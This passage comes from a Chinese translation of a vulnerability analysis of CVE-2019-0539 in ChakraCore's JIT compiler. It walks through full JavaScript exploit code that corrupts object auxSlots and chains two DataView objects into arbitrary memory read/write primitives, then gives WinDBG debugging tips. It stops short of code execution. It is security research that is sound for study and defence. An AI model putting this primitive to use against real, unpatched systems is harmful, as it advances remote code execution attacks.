  4. 用第一个`DataView`对象`dv1`来准确地将第二个`DataView`对象`dv2`的缓冲区字段设置为我们选择的地址（`dv1.setUint32(0x38, 0xDEADBEEF, true); dv1.setUint32(0x3C, 0xDEADBEEF, true);`）。注意我们是如何将选择的地址（0xDEADBEEFDEADBEEF）写入`dv2`缓冲区字段的精确偏移处（0x38）。
  5. 用第二个`DataView`对象`dv2`来读写我们选择的地址（`dv2.getUint32(0, true); dv2.getUint32(4, true);`）  
重复执行步骤4和5来执行我们的读写操作。

下面就是完全读写原语的代码：

    
    
    // commit 331aa3931ab69ca2bd64f7e020165e693b8030b5
    obj = {}
    obj.a = 1;
    obj.b = 2;
    obj.c = 3;
    obj.d = 4;
    obj.e = 5;
    obj.f = 6;
    obj.g = 7;
    obj.h = 8;
    obj.i = 9;
    obj.j = 10;
    
    dv1 = new DataView(new ArrayBuffer(0x100));
    dv2 = new DataView(new ArrayBuffer(0x100));
    
    BASE = 0x100000000;
    
    function hex(x) {
        return "0x" + x.toString(16);
    }
    
    function opt(o, c, value) {
        o.b = 1;
    
        class A extends c {}
    
        o.a = value;
    }
    
    function main() {
        for (let i = 0; i < 2000; i++) {
            let o = {a: 1, b: 2};
            opt(o, (function () {}), {});
        }
    
        let o = {a: 1, b: 2};
        let cons = function () {};
    
        cons.prototype = o;
    
        opt(o, cons, obj); // o->auxSlots = obj (Step 1)
    
        o.c = dv1; // obj->auxSlots = dv1 (Step 2)
    
        obj.h = dv2; // dv1->buffer = dv2 (Step 3)
    
        let read64 = function(addr_lo, addr_hi) {
            // dv2->buffer = addr (Step 4)
            dv1.setUint32(0x38, addr_lo, true);
            dv1.setUint32(0x3C, addr_hi, true);
    
            // read from addr (Step 5)
            return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
        }
    
        let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
            // dv2->buffer = addr (Step 4)
            dv1.setUint32(0x38, addr_lo, true);
            dv1.setUint32(0x3C, addr_hi, true);
    
            // write to addr (Step 5)
            dv2.setInt32(0, value_lo, true);
            dv2.setInt32(0, value_hi, true);
        }
    
        // get dv2 vtable pointer
        vtable_lo = dv1.getUint32(0, true);
        vtable_hi = dv1.getUint32(4, true);
        print(hex(vtable_lo + vtable_hi * BASE));
    
        // read first vtable entry using the RW primitive
        print(hex(read64(vtable_lo, vtable_hi)));
    
        // write a value to address 0x1111111122222222 using the RW primitive (this will crash)
        write64(0x22222222, 0x11111111, 0x1337, 0x1337);
    }
    
    main();
    

注意：如果想要调试自己的代码（例如WinDBG），一个很便捷的方法就是使用”instruments”来断在感兴趣的JS代码处。可参考一下两条有用的建议：

  * 在`ch!WScriptJsrt::EchoCallback`设置断点从而阻止`print()`调用
  * 在`chakracore!Js::DynamicTypeHandler::SetSlotUnchecked`设置断点，阻止解释器执行的`DynamicObject`属性赋值操作。这对于查看javascript对象（`o`和`obj`）如何破坏内存中的其他对象很有帮助。

将两者任意结合起来可以轻松定位利用代码。

## 总结

我们已经见识了如何利用`DynamicObject`的`auxSlots`的JIT破坏来最终获得完全读写原语。我们利用损坏的对象进一步破坏其他感兴趣的对象。——特别是两个`DataView`对象，前一个精确地破坏了第二个，从而控制原语地址的选择。我们不得不绕过
javascript’s DynamicObject “API”
中的一些限制。最后，请注意，获得完全读写原语仅仅此漏洞利用的第一步。攻击者仍然需要重定向程序执行流程来获得完成的RCE。但是，这些内容超出了本文章的范畴，可以留给读者自行练习。

本文翻译自perception-point.io [原文链接](https://perception-point.io/resources/research/cve-2019-0539-root-cause-analysis/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **_vige** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/173475](/post/id/173475)

安全客 - 有思想的安全新媒体

本文转载自: [perception-point.io](https://perception-point.io/resources/research/cve-2019-0539-root-cause-analysis/)

如若转载,请注明出处： <https://perception-point.io/resources/research/cve-2019-0539-root-cause-analysis/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [RCE](/tag/RCE)
  * [CVE-2019-0539](/tag/CVE-2019-0539)

 **+1** __8赞

 __收藏

![](https://tvax2.sinaimg.cn/crop.0.0.512.512.180/ac111bb8ly8fwun6z07nbj20e80e8aag.jpg)
_vige

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

